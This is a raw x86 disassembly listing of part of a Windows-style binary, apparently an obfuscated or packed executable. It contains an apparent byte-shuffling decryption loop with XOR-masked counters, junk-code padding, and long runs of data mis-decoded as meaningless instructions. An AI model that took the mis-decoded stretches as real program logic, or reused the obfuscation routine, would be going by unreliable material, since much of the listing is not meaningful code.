  4060f0:	test   BYTE PTR [edx-0x3b96debf],cl
  4060f6:	enter  0xaeae,0x2f
  4060fa:	imul   ecx,eax,0x49
  4060fd:	lea    esi,[edx]
  4060ff:	sbb    eax,0xda974fca
  406104:	push   esi
  406105:	stc    
  406106:	ins    BYTE PTR es:[edi],dx
  406107:	dec    ebp
  406108:	jecxz  0x40608d
  40610a:	scas   eax,DWORD PTR es:[edi]
  40610b:	dec    esi
  40610c:	jo     0x62bed99c
  406112:	and    al,0xa0
  406114:	mov    ebx,ebx
  406116:	jle    0x40611e
  406118:	psrld  mm1,QWORD PTR [ecx+eax*4]
  40611c:	dec    edx
  40611d:	push   edi
  40611e:	cli    
  40611f:	fiadd  WORD PTR [ecx]
  406121:	mov    ch,0xea
  406123:	xor    eax,0x832ae0d6
  406128:	fidivr DWORD PTR [edx-0x2c64ceed]
  40612e:	mov    BYTE PTR [ebx],bh
  406130:	xor    al,0x27
  406132:	pop    edi
  406133:	jne    0x4060fe
  406135:	ficom  DWORD PTR [edx]
  406137:	adc    DWORD PTR [ebx+edx*8],ebx
  40613a:	jp     0x4060d8
  40613c:	mov    ebp,0x589a6cf1
  406141:	(bad)  [ebp+0x1c]
  406144:	imul   ecx,DWORD PTR [esi-0x2d],0xc7eb5549
  40614b:	repz pop edx
  40614d:	(bad)  
  40614e:	(bad)  
  40614f:	xchg   ebp,eax
  406150:	adc    al,BYTE PTR [esi]
  406152:	sub    eax,0x1be50357
  406157:	daa    
  406158:	jge    0x4061c1
  40615a:	mov    ds:0x4db5af3f,eax
  40615f:	cmp    cl,BYTE PTR [edi-0x37]
  406162:	mov    ch,0xa9
  406164:	mov    al,ds:0x9d8cba22
  406169:	jae    0x40619a
  40616b:	cmp    ah,BYTE PTR [edi-0x3]
  40616e:	and    dl,BYTE PTR [ecx]
  406170:	xor    BYTE PTR [ebp+0x28],bl
  406173:	std    
  406174:	test   al,0xab
  406176:	sahf   
  406177:	je     0x406136
  406179:	mov    DWORD PTR [eax+0xd95e4d1],ebx
  40617f:	pop    edx
  406180:	jbe    0x40613e
  406182:	scas   eax,DWORD PTR es:[edi]
  406183:	push   ss
  406184:	mov    dl,0x7e
  406186:	adc    BYTE PTR [ebx-0x688eb205],0x14
  40618d:	jb     0x406180
  40618f:	stos   DWORD PTR es:[edi],eax
  406190:	or     DWORD PTR [ebp+0x3d],0x3a4a3422
  406197:	test   DWORD PTR [esi+ecx*8-0x3e4e532d],ecx
  40619e:	cmp    esp,DWORD PTR [ebx+ebp*2+0x72d67786]
  4061a5:	mov    DWORD PTR [ecx+0x4a],eax
  4061a8:	sbb    ebp,ebp
  4061aa:	cmp    ch,ch
  4061ac:	xchg   ebp,eax
  4061ad:	(bad)  
  4061ae:	mov    cs:0xd48fd75,eax
  4061b4:	jnp    0x406185
  4061b6:	loopne 0x406175
  4061b8:	xor    esi,DWORD PTR [ecx-0x32]
  4061bb:	push   cs
  4061bc:	scas   al,BYTE PTR es:[edi]
  4061bd:	repz sub al,BYTE PTR [edx]
  4061c0:	ficomp DWORD PTR [edx]
  4061c2:	sbb    BYTE PTR [ebp+0x17],ch
  4061c5:	mov    eax,0x35174298
  4061ca:	addr16 jb 0x406161
  4061cd:	jo     0x40623c
  4061cf:	daa    
  4061d0:	and    dh,al
  4061d2:	push   esp
  4061d3:	mov    ds:0xdf9329cd,al
  4061d8:	std    
  4061d9:	imul   esp
  4061db:	pop    es
  4061dc:	outs   dx,DWORD PTR ds:[esi]
  4061dd:	jns    0x406194
  4061df:	lds    edx,FWORD PTR [ecx]
  4061e1:	out    dx,eax
  4061e2:	jmp    0xc08d:0xd671e2f8
  4061e9:	sub    al,0x5a
  4061eb:	inc    edi
  4061ec:	mov    eax,0xbabe01cf
  4061f1:	(bad)  
  4061f2:	enter  0x6c39,0xac
  4061f6:	pop    ebx
  4061f7:	push   ebp
  4061f8:	mov    ecx,ebx
  4061fa:	and    al,0x1f
  4061fc:	pop    edi
  4061fd:	dec    ebp
  4061fe:	sbb    esi,edi
  406200:	retf   
  406201:	(bad)  
  406202:	xchg   esp,eax
  406203:	add    eax,0x364e4485
  406208:	push   ebp
  406209:	jmp    0xbc38adc
  40620e:	sbb    BYTE PTR [ebx],0x12
  406211:	ss inc ebx
  406213:	lods   al,BYTE PTR ds:[esi]
  406214:	popa   
  406215:	add    ah,BYTE PTR [edx+esi*2-0x2bfa2ad2]
  40621c:	add    eax,0x3e4bbcba
  406221:	mov    eax,0x8dbef593
  406226:	cmc    
  406227:	jge    0x406264
  406229:	push   ecx
  40622a:	xchg   esi,eax
  40622b:	pushf  
  40622c:	and    al,0x2e
  40622e:	pusha  
  40622f:	cld    
  406230:	pop    ecx
  406231:	jmp    0x406259
  406233:	(bad)  
  406234:	adc    BYTE PTR es:[esi+0x7d],bh
  406238:	int    0x50
  40623a:	or     BYTE PTR [esi+0x1a8dbe1b],0xdd
  406241:	aam    0x0
  406243:	ds sti 
  406245:	xor    eax,0x2c48df5e
  40624a:	cmp    bh,dh
  40624c:	inc    ebp
  40624d:	mov    ecx,0xca267c4c
  406252:	call   0x18c4:0x8081361d
  406259:	(bad)  
  40625a:	loopne 0x40628a
  40625c:	mov    bl,0x5
  40625e:	test   DWORD PTR [edx+esi*1+0x7c2b2bc7],esp
  406265:	fild   DWORD PTR [edx+0x28b8e513]
  40626b:	jae    0x4062a8
  40626d:	pusha  
  40626e:	xor    DWORD PTR ds:0x34043a33,0xf7e09456
  406278:	dec    edi
  406279:	call   0xb486:0xf799f253
  406280:	ss repz retf 
  406283:	cld    
  406284:	(bad)  
  406286:	fst    DWORD PTR [edi+0x7ac6453d]
  40628c:	xabort 0x8f
  40628f:	test   eax,0x4d79f10a
  406294:	ss and dh,0x6d
  406298:	push   esi
  406299:	sbb    edi,DWORD PTR [esi+eiz*4+0x587fb59f]
  4062a0:	xor    dl,BYTE PTR [ebp+edi*2-0x4d]
  4062a4:	or     edx,esp
  4062a6:	aad    0xf4
  4062a8:	sub    eax,0xc8f099e3
  4062ad:	sbb    eax,0x4441cb76
  4062b2:	test   eax,0xca0fa00e
  4062b7:	xor    al,0x23
  4062b9:	jl     0x406327
  4062bb:	mov    bh,0xf1
  4062bd:	popf   
  4062be:	or     ch,bh
  4062c0:	cmc    
  4062c1:	or     al,0xae
  4062c3:	xor    bl,BYTE PTR [eax]
  4062c5:	dec    ecx
  4062c6:	cmp    dh,BYTE PTR [esi-0x1]
  4062c9:	shr    BYTE PTR [edx],1
  4062cb:	mov    ds:0x613f678c,eax
  4062d0:	xchg   BYTE PTR [ebx],bl
  4062d2:	dec    edx
  4062d3:	jecxz  0x40630d
  4062d5:	aad    0x86
  4062d7:	mov    dh,BYTE PTR [edx+0x3f]
  4062da:	jae    0x406340
  4062dc:	nop
  4062dd:	mov    BYTE PTR [ebp-0x71],ah
  4062e0:	cmp    bl,BYTE PTR [edx-0x4f0d9683]
  4062e6:	rcl    BYTE PTR [esi-0x36d909ee],0xdb
  4062ed:	sbb    al,0x7
  4062ef:	ins    DWORD PTR es:[edi],dx
  4062f0:	test   al,0x6a
  4062f2:	shr    DWORD PTR [eax+0x63d17b19],0xce
  4062f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062fa:	jmp    0x4062bd
  4062fc:	pusha  
  4062fd:	sub    BYTE PTR [ecx-0x61],dl
  406300:	fcomp  DWORD PTR [eax+0x51]
  406303:	xlat   BYTE PTR ds:[ebx]
  406304:	and    al,0x5
  406306:	mov    al,0x5d
  406308:	push   0xffffffdd
  40630a:	add    BYTE PTR [eax-0x11fbe41c],0xb
  406311:	pop    ds
  406312:	rcl    BYTE PTR [edi-0x5c2cdfb4],0x8
  406319:	cdq    
  40631a:	ret    
  40631b:	in     eax,0x47
  40631d:	inc    ebp
  40631e:	fs jnp 0x406361
  406321:	in     eax,dx
  406322:	and    BYTE PTR [eax+0x2a1c6e8c],cl
  406328:	add    ebx,DWORD PTR [esi-0x1c]
  40632b:	mov    edi,DWORD PTR [ebx+eax*2+0x7ae361e0]
  406332:	ret    
  406333:	or     eax,0x5f77e1fa
  406338:	sti    
  406339:	dec    edi
  40633a:	mov    edi,0xa260c2dd
  40633f:	iret   
  406340:	mov    edi,0x53b2920e
  406345:	sbb    al,0xa1
  406347:	sub    eax,DWORD PTR [ecx]
  406349:	add    BYTE PTR [edx+edx*2-0x37],bh
  40634d:	jae    0x40634e
  40634f:	stc    
  406350:	sbb    edi,edx
  406352:	(bad)  
  406353:	push   ebx
  406354:	jne    0x4062f5
  406356:	pop    es
  406357:	and    ch,BYTE PTR [esi-0x5]
  40635a:	mov    eax,0xed827e7
  40635f:	dec    esp
  406360:	in     al,0xb9
  406362:	int3   
  406363:	cmp    esp,DWORD PTR [esi+0x55]
  406366:	test   al,0xab
  406368:	sti    
  406369:	or     cl,dl
  40636b:	or     edi,esp
  40636d:	xchg   esp,eax
  40636e:	fnstenv [bp+si-0xe]
  406372:	mov    DWORD PTR [esi-0xcdc79a4],edi
  406378:	mov    ds:0x6b09d145,eax
  40637d:	jmp    0x807b:0x8b03449b
  406384:	mul    BYTE PTR [ebp+0x596de99f]
  40638a:	mov    ?,WORD PTR [esi+0x2]
  40638d:	int    0x4
  40638f:	jmp    0x4063a4
  406391:	mov    cs,WORD PTR [ecx+eax*1]
  406394:	cmp    eax,0xd39b00e
  406399:	retf   
  40639a:	enter  0xb154,0x40
  40639e:	nop
  40639f:	pop    ecx
  4063a0:	and    BYTE PTR [ecx],ah
  4063a2:	es and eax,0x391edf1a
  4063a8:	pop    esp
  4063a9:	adc    BYTE PTR [edi],bh
  4063ab:	mov    ecx,0x5266f76c
  4063b0:	cdq    
  4063b1:	cld    
  4063b2:	jno    0x406401
  4063b4:	add    BYTE PTR [eax],dl
  4063b6:	stc    
  4063b7:	pusha  
  4063b8:	xor    DWORD PTR [edi],eax
  4063ba:	and    eax,0x3968dfa6
  4063bf:	push   esp
  4063c0:	ficom  WORD PTR [edi+0x69]
  4063c3:	mov    eax,ds:0xa0dc8ce5
  4063c8:	daa    
  4063c9:	in     eax,0xc4
  4063cb:	ins    BYTE PTR es:[edi],dx
  4063cc:	or     DWORD PTR [edx+eiz*2-0x30],0xd
  4063d1:	push   es
  4063d2:	scas   eax,DWORD PTR es:[edi]
  4063d3:	jbe    0x4063dc
  4063d9:	mov    edx,DWORD PTR [ebp-0x3c]
  4063dc:	mov    edi,DWORD PTR [ebp-0x4]
  4063df:	xor    edi,eax
  4063e1:	xor    edx,eax
  4063e3:	add    edi,ecx
  4063e5:	add    edx,ecx
  4063e7:	imul   edx,edi
  4063ea:	mov    DWORD PTR [ebp+0xc],edx
  4063ed:	mov    edx,DWORD PTR [ebp+0xc]
  4063f0:	mov    DWORD PTR [ebp-0x24],edx
  4063f3:	mov    edx,DWORD PTR [ebp-0x8]
  4063f6:	add    edx,DWORD PTR [ebp-0x40]
  4063f9:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  406400:	mov    DWORD PTR [ebp-0x1c],edx
  406403:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40640a:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  406411:	mov    edx,DWORD PTR [ebp-0x18]
  406414:	xor    edx,eax
  406416:	add    edx,ecx
  406418:	jmp    0x4067df
  40641d:	mov    edx,DWORD PTR [ebp-0x18]
  406420:	xor    edx,eax
  406422:	add    edx,DWORD PTR [ebp-0x14]
  406425:	mov    edi,DWORD PTR [ebp-0x1c]
  406428:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  40642f:	mov    BYTE PTR [ebp+0xf],dl
  406432:	mov    edx,DWORD PTR [ebp-0xc]
  406435:	xor    edx,eax
  406437:	add    edx,DWORD PTR [ebp-0x14]
  40643a:	mov    edi,DWORD PTR [ebp-0x1c]
  40643d:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  406444:	mov    BYTE PTR [ebp+0xb],dl
  406447:	mov    dl,BYTE PTR [ebp+0xf]
  40644a:	mov    edi,DWORD PTR [ebp-0xc]
  40644d:	jmp    0x4067a7
  406452:	pop    esi
  406453:	xlat   BYTE PTR ds:[ebx]
  406454:	pop    edi
  406455:	jmp    0x4064ce
  406457:	jae    0x4064c3
  406459:	push   ebx
  40645a:	jmp    0x4064aa
  40645c:	cmc    
  40645d:	pop    ss
  40645e:	mov    ebx,0xa588fefc
  406463:	cmp    BYTE PTR [esi+0x7e],bh
  406466:	xor    edi,DWORD PTR [ebp+0x7e]
  406469:	jle    0x4064b0
  40646b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40646c:	repz xor eax,0x6fa8bd55
  406472:	xor    bh,BYTE PTR [edx+0x74]
  406475:	xchg   ecx,eax
  406476:	ret    0xe21e
  406479:	test   eax,0x27a05aa6
  40647e:	out    0x4b,eax
  406480:	stc    
  406481:	lea    edx,[esi-0x4e]
  406484:	(bad)  
  406485:	adc    ch,dl
  406487:	mov    ch,BYTE PTR [ebp+eiz*2-0x7cffb052]
  40648e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40648f:	int    0x46
  406491:	xchg   esi,eax
  406492:	lock sbb al,0x3f
  406495:	add    ebx,DWORD PTR [ecx-0x7fd6e124]
  40649b:	or     dh,BYTE PTR [ecx+ecx*8-0x78b23096]
  4064a2:	fs arpl cx,dx
  4064a5:	jl     0x40643e
  4064a7:	xchg   esp,eax
  4064a8:	mov    dl,0xb3
  4064aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064ab:	clc    
  4064ac:	cwde   
  4064ad:	push   cs
  4064ae:	inc    edx
  4064af:	or     eax,0x2c66374b
  4064b4:	push   ecx
  4064b5:	or     DWORD PTR [ebx+0x4e],0x5a
  4064b9:	jle    0x406528
  4064bb:	(bad)
  4064be:	sub    ebp,DWORD PTR [ebp-0x6a794025]
  4064c4:	mov    eax,eax
  4064c6:	rcl    BYTE PTR ss:[edi],0x82
  4064ca:	dec    ebp
  4064cb:	sub    eax,edi
  4064cd:	repnz or BYTE PTR [eax],cl
  4064d0:	xor    al,BYTE PTR [ecx]
  4064d2:	lock ins DWORD PTR es:[edi],dx
  4064d4:	aam    0xfe
  4064d6:	mov    ds:0x7f4dedd9,al
  4064db:	cmp    esi,DWORD PTR [edx]
  4064dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064de:	call   0x42f8:0x85adaf47
  4064e5:	test   al,0x9e
  4064e7:	clc    
  4064e8:	jge    0x40654e
  4064ea:	enter  0x270f,0x8d
  4064ee:	jmp    0x40650b
  4064f0:	(bad)  
  4064f1:	shr    DWORD PTR [eax+0x75ca4e0b],cl
  4064f7:	dec    esi
  4064f8:	push   cs
  4064f9:	jmp    0xc05a8e85
  4064fe:	dec    esi
  4064ff:	mov    ebx,0x2547728a
  406504:	sbb    ch,dl
  406506:	inc    ebx
  406507:	lahf   
  406508:	neg    DWORD PTR [edi]
  40650a:	adc    DWORD PTR [edx+0x42],0xffffffb4
  40650e:	and    DWORD PTR [edi],ecx
  406510:	jl     0x4064a2
  406512:	call   0x83a4c4c3
  406517:	cmp    DWORD PTR [edx],ebx
  406519:	outs   dx,BYTE PTR ds:[esi]
  40651a:	out    dx,al
  40651b:	repz push edi
  40651d:	clc    
  40651e:	xchg   ebp,eax
  40651f:	dec    ecx
  406520:	es mov dl,0xf2
  406523:	sub    eax,0xa6aaf1da
  406528:	jmp    0x5ae2:0x185435b9
  40652f:	ror    DWORD PTR [ebx+ebx*4],0xf9
  406533:	rol    BYTE PTR [edx-0x42945d42],0xa2
  40653a:	ja     0x4065a1
  40653c:	xor    BYTE PTR [edx+0x734b6b91],bl
  406542:	mov    ebp,edi
  406544:	mov    ebp,0xf4f5f908
  406549:	test   eax,ebp
  40654b:	jg     0x406587
  40654d:	repnz popf 
  40654f:	jns    0x406547
  406551:	xor    eax,0xd3ec571b
  406556:	ficom  WORD PTR [eax]
  406558:	xchg   esi,eax
  406559:	int    0xcb
  40655b:	sbb    dh,BYTE PTR [eax+0x65]
  40655e:	test   DWORD PTR [ebx-0x6b],esi
  406561:	adc    eax,0x21756c43
  406566:	rcr    DWORD PTR [ebx-0x65],cl
  406569:	ror    BYTE PTR [ecx-0x22],0x7c
  40656d:	and    edx,DWORD PTR [ebx-0x13]
  406570:	rcl    DWORD PTR [edx-0x2bfd2b45],cl
  406576:	mov    ebx,0x150c0a5c
  40657b:	daa    
  40657c:	outs   dx,WORD PTR ds:[esi]
  40657e:	adc    DWORD PTR [esi-0xb0a1ef0],esp
  406584:	shl    BYTE PTR fs:[ebx],1
  406587:	scas   eax,DWORD PTR es:[edi]
  406588:	in     al,dx
  406589:	cmc    
  40658a:	push   ebp
  40658b:	add    BYTE PTR [ebx-0x7d],bl
  40658e:	in     al,dx
  40658f:	xor    bl,BYTE PTR [edi-0x5a]
  406592:	sub    eax,0x6d5b193b
  406597:	or     BYTE PTR [eax],0x9b
  40659a:	or     al,0x59
  40659c:	jecxz  0x4065bc
  40659e:	sub    eax,0xf7809ce3
  4065a3:	xor    eax,0xe67cafa8
  4065a8:	sub    eax,DWORD PTR [esp+edi*1+0x65]
  4065ac:	or     al,0x9
  4065ae:	jmp    0x8c9c:0xb2f7fc12
  4065b5:	add    DWORD PTR [edi+ebx*2],edx
  4065b8:	addr16 inc esi
  4065ba:	sub    BYTE PTR [ebx],dh
  4065bc:	sub    BYTE PTR [edx+ebx*1-0x53],bl
  4065c0:	pusha  
  4065c1:	clc    
  4065c2:	or     al,0x6e
  4065c4:	in     eax,dx
  4065c5:	cmp    ah,BYTE PTR ds:0x6e8d6aee
  4065cb:	jns    0x406615
  4065cd:	hlt    
  4065ce:	(bad)  
  4065cf:	pop    ss
  4065d0:	sbb    BYTE PTR [ecx+ebp*1],al
  4065d3:	loope  0x40659a
  4065d5:	stos   DWORD PTR es:[edi],eax
  4065d6:	ds jb  0x40659f
  4065d9:	test   al,0x33
  4065db:	ud1    ebx,DWORD PTR [edx]
  4065de:	or     bh,BYTE PTR [edx-0x2367266d]
  4065e4:	jle    0x406619
  4065e6:	xor    BYTE PTR [ebp+0x226cad6e],0x10
  4065ed:	aaa    
  4065ee:	stos   DWORD PTR es:[edi],eax
  4065ef:	mov    dh,0x0
  4065f1:	mov    BYTE PTR [edx],bl
  4065f3:	and    eax,DWORD PTR [esi+0x3e]
  4065f6:	fmul   DWORD PTR [edx+0x74646384]
  4065fc:	push   ebp
  4065fd:	stos   DWORD PTR es:[edi],eax
  4065fe:	aaa    
  4065ff:	clc    
  406600:	mov    ah,0xc6
  406602:	xlat   BYTE PTR ds:[ebx]
  406603:	adc    eax,0x607b97a2
  406608:	add    eax,0xf5a9a1d9
  40660d:	enter  0x35c5,0xa6
  406611:	ds mov bl,0x9e
  406614:	maxps  xmm0,XMMWORD PTR [esi-0x70]
  406618:	into   
  406619:	test   DWORD PTR [ebp+0x4d],esp
  40661c:	jecxz  0x40668d
  40661e:	xchg   ecx,eax
  40661f:	inc    esi
  406620:	scas   eax,DWORD PTR es:[edi]
  406621:	lods   al,BYTE PTR ds:[esi]
  406622:	push   eax
  406623:	outs   dx,BYTE PTR ds:[esi]
  406624:	and    BYTE PTR ss:[ebx-0x45],bl
  406628:	mov    ds:0x45796661,eax
  40662d:	lds    esp,FWORD PTR [edx+0x7db0d1dd]
  406633:	push   ebp
  406634:	fidiv  DWORD PTR [edi-0x63]
  406637:	inc    ebp
  406638:	inc    edx
  406639:	jmp    0x40665a
  40663b:	pop    ds
  40663c:	fucomi st,st(0)
  40663e:	cmp    ebx,DWORD PTR [edx-0x5829f944]
  406644:	test   bh,0x8c
  406647:	push   edx
  406648:	ins    BYTE PTR es:[edi],dx
  406649:	xchg   ebx,eax
  40664a:	scas   eax,DWORD PTR es:[edi]
  40664b:	daa    
  40664c:	mov    bl,0xce
  40664e:	ret    0x29b1
  406651:	jle    0x4066ad
  406653:	lods   eax,DWORD PTR ds:[esi]
  406654:	push   esi
  406655:	ds popa 
  406657:	cmp    edi,esi
  406659:	mov    al,ds:0x5179f8c6
  40665e:	sub    bl,al
  406660:	rol    DWORD PTR [ecx-0x70],0xd7
  406664:	add    eax,0xd7319234
  406669:	(bad)  
  40666a:	sbb    BYTE PTR [esi-0x1459c633],dh
  406670:	cmp    BYTE PTR [ebx+0x1137228e],ch
  406676:	jbe    0x40666f
  406678:	cwde   
  406679:	jl     0x406669
  40667b:	into   
  40667c:	add    ecx,DWORD PTR [ebp+0x5c]
  40667f:	jnp    0x406649
  406681:	push   ecx
  406682:	cmp    ah,BYTE PTR [esi+0x64]
  406685:	outs   dx,BYTE PTR ds:[esi]
  406686:	(bad)  
  406687:	out    0x8a,al
  406689:	cmp    BYTE PTR cs:[ecx+0x72],0x72
  40668e:	mov    bl,0xf1
  406690:	sbb    eax,0x7ac0c30a
  406695:	pop    ss
  406696:	mov    ds:0x2ae8358e,al
  40669b:	mov    al,0x86
  40669d:	in     al,0xd8
  40669f:	popa   
  4066a0:	inc    ebx
  4066a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066a2:	(bad)  
  4066a4:	fcom   st(2)
  4066a6:	popf   
  4066a7:	fmulp  st(2),st
  4066a9:	cmp    ebp,ebx
  4066ab:	ss hlt 
  4066ad:	push   eax
  4066ae:	and    esp,DWORD PTR [ecx]
  4066b0:	leave  
  4066b1:	cmp    edx,DWORD PTR [edi]
  4066b3:	add    edx,DWORD PTR [ebx-0x42]
  4066b6:	cdq    
  4066b7:	mov    ecx,0xae138f13
  4066bc:	and    eax,0x671f9666
  4066c1:	lahf   
  4066c2:	inc    ebp
  4066c3:	sub    ebp,esp
  4066c5:	push   0xffffff9a
  4066c7:	cli    
  4066c8:	xchg   ecx,eax
  4066c9:	xchg   ebx,eax
  4066ca:	mov    bh,0x26
  4066cc:	pop    edx
  4066cd:	jmp    0x76dd3395
  4066d2:	xor    DWORD PTR [ebp+0x4eb5735c],0xffffffc7
  4066d9:	push   esp
  4066da:	loope  0x40670a
  4066dc:	bound  ecx,QWORD PTR [ecx]
  4066de:	inc    ebx
  4066df:	js     0x406708
  4066e1:	sbb    DWORD PTR [eax],esi
  4066e3:	jmp    0x3e19:0x6857a854
  4066ea:	imul   ebp,DWORD PTR [edi],0x3c
  4066ed:	mov    esp,0x1c71edee
  4066f2:	mov    eax,0xa4547ee0
  4066f7:	fs adc eax,0xcbc2cd4f
  4066fd:	cmp    DWORD PTR [eax],0xc1c9f1a3
  406703:	ja     0x406784
  406705:	test   eax,0xced0f8a4
  40670a:	call   0x2b341401
  40670f:	jo     0x4066fd
  406711:	shl    BYTE PTR [edx+0x70b27039],cl
  406717:	fs neg edi
  40671a:	xor    eax,DWORD PTR [edi-0x33859429]
  406720:	inc    edx
  406721:	mov    dl,0xdb
  406723:	outs   dx,BYTE PTR ds:[esi]
  406724:	push   ebx
  406725:	out    dx,al
  406726:	outs   dx,DWORD PTR ds:[esi]
  406727:	mov    dh,0x1c
  406729:	sub    eax,0x6514d7b4
  40672e:	arpl   WORD PTR [edi-0x307aec9e],si
  406734:	mov    edi,0x815d3d13
  406739:	rcr    esp,1
  40673b:	aam    0x2f
  40673d:	mov    edi,0x32da8940
  406742:	pop    eax
  406743:	xor    DWORD PTR [ebp+0x75],ecx
  406746:	cmp    eax,DWORD PTR [ebp+0x58b7ee87]
  40674c:	xchg   DWORD PTR [ecx-0x10],ebx
  40674f:	xchg   BYTE PTR [eax+0x2ff227c8],ah
  406755:	out    dx,al
  406756:	shr    DWORD PTR [ebx-0x13],cl
  406759:	push   cs
  40675a:	pop    edx
  40675b:	idiv   DWORD PTR [eax+0x412ef05e]
  406761:	jecxz  0x4067b5
  406763:	push   edi
  406764:	push   esp
  406765:	push   esp
  406766:	or     dh,BYTE PTR [ecx+0x15]
  406769:	gs and al,0x6b
  40676c:	repz cmc 
  40676e:	scas   eax,DWORD PTR es:[edi]
  40676f:	cdq    
  406770:	ss sbb al,0x2a
  406773:	jmp    0x557:0xa5a7332b
  40677a:	sbb    DWORD PTR [eax+0x6f16a7c2],edi
  406780:	mov    dh,0x7f
  406782:	sub    al,0x8e
  406784:	or     DWORD PTR [edx-0x27],0xffffffa5
  406788:	data16 mov ch,0xa9
  40678b:	int    0x7d
  40678d:	dec    eax
  40678e:	sbb    DWORD PTR [ecx-0x7a5bb4c4],esp
  406794:	and    bh,BYTE PTR [eax]
  406796:	(bad)  
  406798:	jl     0x406798
  40679a:	data16 adc dl,BYTE PTR [eax+ebp*1+0x41c23d23]
  4067a2:	mov    eax,0x498ecc86
  4067a7:	xor    edi,eax
  4067a9:	add    edi,DWORD PTR [ebp-0x14]
  4067ac:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067af:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067b6:	mov    dl,BYTE PTR [ebp+0xb]
  4067b9:	mov    edi,DWORD PTR [ebp-0x18]
  4067bc:	xor    edi,eax
  4067be:	add    edi,DWORD PTR [ebp-0x14]
  4067c1:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067c4:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067cb:	mov    edx,DWORD PTR [ebp-0x44]
  4067ce:	mov    edi,DWORD PTR [ebp-0xc]
  4067d1:	xor    edx,eax
  4067d3:	xor    edi,eax
  4067d5:	add    edx,ecx
  4067d7:	add    edi,ecx
  4067d9:	imul   edx,edi
  4067dc:	add    edx,DWORD PTR [ebp-0x14]
  4067df:	mov    DWORD PTR [ebp-0x14],edx
  4067e2:	mov    edx,DWORD PTR [ebp-0xc]
  4067e5:	mov    edi,DWORD PTR [ebp-0x24]
  4067e8:	xor    edx,eax
  4067ea:	add    edx,ecx
  4067ec:	imul   edx,edi
  4067ef:	mov    edi,DWORD PTR [ebp-0xc]
  4067f2:	xor    edi,eax
  4067f4:	sub    edx,edi
  4067f6:	mov    edi,DWORD PTR [ebp-0xc]
  4067f9:	mov    ebx,DWORD PTR [ebp-0x14]
  4067fc:	xor    edi,eax
  4067fe:	add    edi,ecx
  406800:	imul   edi,ebx
  406803:	mov    ebx,DWORD PTR [ebp-0x18]
  406806:	xor    ebx,eax
  406808:	sub    edx,ecx
  40680a:	lea    edi,[edi+ebx*1+0x32729b]
  406811:	cmp    edi,edx
  406813:	jbe    0x40641d
  406819:	mov    edx,DWORD PTR [ebp-0xc]
  40681c:	mov    edi,DWORD PTR [ebp-0x24]
  40681f:	xor    edx,eax
  406821:	add    edx,ecx
  406823:	imul   edx,edi
  406826:	mov    edi,DWORD PTR [ebp-0x18]
  406829:	xor    edi,eax
  40682b:	add    edx,edi
  40682d:	mov    edi,DWORD PTR [ebp-0x8]
  406830:	lea    edx,[edx+edi*1+0x32729b]
  406837:	mov    DWORD PTR [ebp-0x8],edx
  40683a:	mov    edx,DWORD PTR [ebp-0x20]
  40683d:	xor    edx,eax
  40683f:	mov    edi,0xffcd8d65
  406844:	sub    edi,edx
  406846:	add    edi,DWORD PTR [ebp-0x10]
  406849:	mov    edx,DWORD PTR [ebp-0x20]
  40684c:	mov    ebx,DWORD PTR [ebp-0x8]
  40684f:	xor    edx,eax
  406851:	add    edx,ecx
  406853:	imul   edx,ebx
  406856:	cmp    edx,edi
  406858:	jbe    0x40501f
  40685e:	pop    ebx
  40685f:	pop    edi
  406860:	leave  
  406861:	ret    0x8
  406864:	push   ebp
  406865:	mov    ebp,esp
  406867:	push   ecx
  406868:	mov    ecx,DWORD PTR ds:0x4338c7
  40686e:	mov    eax,ds:0x4338df
  406873:	sub    ecx,eax
  406875:	xor    ecx,DWORD PTR [ecx+eax*1]
  406878:	mov    ecx,DWORD PTR [ebp+0x8]
  40687b:	and    DWORD PTR ds:0x4337eb,0x0
  406885:	jmp    0x406895
  40688a:	mov    eax,ds:0x4337eb
  40688f:	inc    eax
  406890:	mov    ds:0x4337eb,eax
  406895:	cmp    DWORD PTR ds:0x4337eb,0x1d
  40689c:	jae    0x4068e6
  4068a2:	cmp    DWORD PTR ds:0x4337eb,0xb
  4068a9:	jne    0x4068c9
  4068af:	push   0x8428
  4068b4:	push   0x433990
  4068b9:	push   0x433990
  4068be:	push   0x4338e7
  4068c3:	call   DWORD PTR ds:0x412378
  4068c9:	cmp    DWORD PTR ds:0x4337eb,0xa
  4068d0:	jne    0x4068e1
  4068d6:	mov    eax,ds:0x4337eb
  4068db:	inc    eax
  4068dc:	mov    ds:0x4337eb,eax
  4068e1:	jmp    0x40688a
  4068e6:	mov    eax,0x7510854
  4068eb:	sbb    DWORD PTR ds:0x43387b,0x4337f3
  4068f5:	xor    ecx,eax
  4068f7:	and    DWORD PTR ds:0x4338af,0x491f
  406901:	add    ecx,0x32729b
  406907:	mov    DWORD PTR ds:0x43379f,0x6297
  406911:	mov    DWORD PTR [ebp+0x10],ecx
  406914:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  40691b:	mov    ecx,0x4881
  406920:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  406927:	mov    ecx,0xf89c8532
  40692c:	push   esi
  40692d:	mov    DWORD PTR ds:0x433833,0x711c
  406937:	mov    DWORD PTR [ebp+0x10],0x70019f3
  40693e:	mov    DWORD PTR ds:0x4337b3,edi
  406944:	mov    esi,DWORD PTR [ebp-0x4]
  406947:	mov    DWORD PTR ds:0x433837,0x237d
  406951:	cmp    ecx,esi
  406953:	mov    DWORD PTR ds:0x433877,0x9b
  40695d:	je     0x406998
  406963:	and    DWORD PTR ds:0x433797,0x274d
  40696d:	mov    esi,DWORD PTR [ebp+0xc]
  406970:	xor    ecx,eax
  406972:	sub    DWORD PTR ds:0x433843,0x433793
  40697c:	xor    esi,eax
  40697e:	lea    ecx,[esi+ecx*1+0x32729b]
  406985:	xor    ecx,eax
  406987:	cmp    ecx,0xf89c8521
